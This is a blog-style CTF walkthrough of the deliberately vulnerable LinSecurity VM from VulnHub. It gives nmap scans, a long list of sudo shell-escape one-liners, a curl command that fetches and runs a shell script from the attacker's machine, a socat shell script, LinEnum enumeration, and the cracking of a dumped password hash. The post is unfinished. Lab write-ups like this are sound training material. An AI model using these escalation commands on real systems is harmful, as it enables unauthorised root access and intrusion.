---
layout: post-detail
title: CTF Linsecurity
date: 2018-10-28
categories: CTF
description: Walkthrough on the CTF LinSecurity iso at https://www.vulnhub.com/entry/linsecurity-1,244/
img-url: ''
comments: true
---

# Iso 

Get the ISO at https://www.vulnhub.com/entry/linsecurity-1,244/

# Target

    $ nmap -sS 192.168.1.0

```txt
Nmap scan report for 192.168.1.14
22/tcp   open  ssh
111/tcp  open  rpcbind
2049/tcp open  nfs
```

There is no web server, it change. A Quick TCP scan.

    $ sudo nmap -sC -sV -vv -oA quick 192.168.1.14

```txt
22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 7.6p1 Ubuntu 4
111/tcp  open  rpcbind syn-ack ttl 64 2-4 (RPC #100000)
2049/tcp open  nfs_acl syn-ack ttl 64 3 (RPC #100227)
```

At [vulnhub](https://www.vulnhub.com/entry/linsecurity-1,244/), we have a message to start:

```txt
To get started you can log onto the host with the credentials: bob/secret
```

Let's connect to ssh:

    $ ssh bob@192.168.1.14

```txt

██╗     ██╗███╗   ██╗   ███████╗███████╗ ██████╗██╗   ██╗██████╗ ██╗████████╗██╗   ██╗
██║     ██║████╗  ██║   ██╔════╝██╔════╝██╔════╝██║   ██║██╔══██╗██║╚══██╔══╝╚██╗ ██╔╝
██║     ██║██╔██╗ ██║   ███████╗█████╗  ██║     ██║   ██║██████╔╝██║   ██║    ╚████╔╝
██║     ██║██║╚██╗██║   ╚════██║██╔══╝  ██║     ██║   ██║██╔══██╗██║   ██║     ╚██╔╝
███████╗██║██║ ╚████║██╗███████║███████╗╚██████╗╚██████╔╝██║  ██║██║   ██║      ██║
╚══════╝╚═╝╚═╝  ╚═══╝╚═╝╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝   ╚═╝      ╚═╝
Welcome to lin.security | https://in.security | version 1.0
```

Ok, so we are connect as bob, let's look at the /home
 
     $ ls /home
     bob peter susan

We found a `.secret` file in susan directory:

    $ ls -la /home/susan
    $ cat /home/susan/.secret
    MySuperS3cretValue

Check sudo perm:

    $ sudo -l
    [sudo] password for bob: secret

bob can run:

```txt
User bob may run the following commands on linsecurity:
    (ALL) /bin/ash, /usr/bin/awk, /bin/bash, /bin/sh,
        /bin/csh, /usr/bin/curl, /bin/dash, /bin/ed,
        /usr/bin/env, /usr/bin/expect, /usr/bin/find,
        /usr/bin/ftp, /usr/bin/less, /usr/bin/man,
        /bin/more, /usr/bin/scp, /usr/bin/socat,
        /usr/bin/ssh, /usr/bin/vi, /usr/bin/zsh,
        /usr/bin/pico, /usr/bin/rvim, /usr/bin/perl,
        /usr/bin/tclsh, /usr/bin/git, /usr/bin/script,
        /usr/bin/scp
```

After found [gtfobins](https://gtfobins.github.io/), we'll try theses commands:

+ ash : sudo ash
+ awk : sudo awk 'BEGIN {system("/bin/sh")}'
+ bash : sudo bash
+ sh : sudo sh
+ csh : sudo csh
+ dash : sudo dash
+ ed : sudo ed (**and after**) !/bin/sh
+ env : sudo env /bin/sh
+ expect : sudo expect -c 'spawn /bin/sh;interact'
+ find : sudo find . -exec /bin/sh \; -quit
+ ftp : sudo ftp (**and after**) !/bin/sh
+ less : sudo less /etc/profile (**and after**) !/bin/sh
+ man : sudo man man (**and after (in the man)**) !/bin/sh
+ more : sudo more /etc/shadow (**and after**) !/bin/sh
+ scp : TF=$(mktemp); echo 'sh 0<&2 1>&2' > $TF; chmod +x "$TF"; sudo scp -S $TF x y:
+ socat : 
+ ssh : sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
+ vi : sudo vi -c ':!/bin/sh'
+ zsh : sudo zsh
+ pico : TERM=xterm; TF=$(mktemp); echo 'exec sh' > $TF; chmod +x $TF; sudo pico -s $TF /etc/hosts (**and after**) Ctrl+T
+ rvim :  
+ perl : sudo perl -e 'exec "/bin/sh";'
+ tclsh : sudo tclsh (**and after**) exec /bin/sh <@stdin >@stdout 2>@stderr
+ git : sudo git help status (**and after**) !/bin/sh 
+ script : sudo script -c '/bin/sh'

Other commands who need more step:

### curl

curl need two pc to work, we can use the perl method above in a script.  
On your pc, write the `shell.sh`:

```sh
cat >> shell.sh << EOF 
sudo perl -e 'exec "/bin/sh";'
EOF
```
    $ python2.7 -m SimpleHTTPServer 4444
    
On linsecurity:

    $ sh <(curl 192.168.1.56:4444/shell.sh)

### socat

We can write a little script like this:

```sh
cat >> socat.sh << EOF 
sudo socat TCP-LISTEN:9999,reuseaddr,fork EXEC:sh,pty,stderr,setsid,sigint,sane &
socat FILE:$(tty),raw,echo=0 TCP:127.0.0.1:9999
EOF 
```
And execute:

    $ sudo sh ./socat.sh

Voila, we have run all commands.

The content bellow is not finished, i explore all other way :)
---
 We can connect as bob and susan, return to bob and chec peter file:

    $ su bob
    $ sudo find / -type f -user peter 2>/dev/null

```txt
/lib/systemd/system/debug.service
```
    $ ls -l /lib/systemd/system/debug.service
    -rw-r--r-- 1 peter root 205 Jul  9 19:56 /lib/systemd/system/debug.service

It should be the final file to gain the root privilege ! 

# LinEnum.sh

    $ cd /tmp
    $ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
    $ sudo sh LinEnum.sh

I've cut some parts:

```sh 
-e [-] Kernel information (continued):
Linux version 4.15.0-23-generic (buildd@lgw01-amd64-055) (gcc version 7.3.0 (Ubuntu 7.3.0-16ubuntu3)) #25-Ubuntu SMP Wed May 23 18:02:16 UTC 2018
-e

-e [-] Contents of /etc/passwd:
insecurity:AzER3pBZh6WZE:0:0::/:/bin/sh

-e [-] Super user account(s):
root
insecurity
-e

-e [-] Root is allowed to login via SSH:
PermitRootLogin yes
-e

-e [-] NFS config details:
/home/peter *(rw)
-e 

-e [+] Looks like we're hosting Docker:
Docker version 18.03.1-ce, build 9ee9f40
-e
```
I use `johntheripper` to crack the hash under `/etc/passwd`:

    $ vim shadow
    insecurity:AzER3pBZh6WZE:0:0::/:/bin/sh
    :wq

    $ /usr/sbin/john shadow
    Loaded 1 password hash (Traditional DES [128/128 BS SSE2-16])
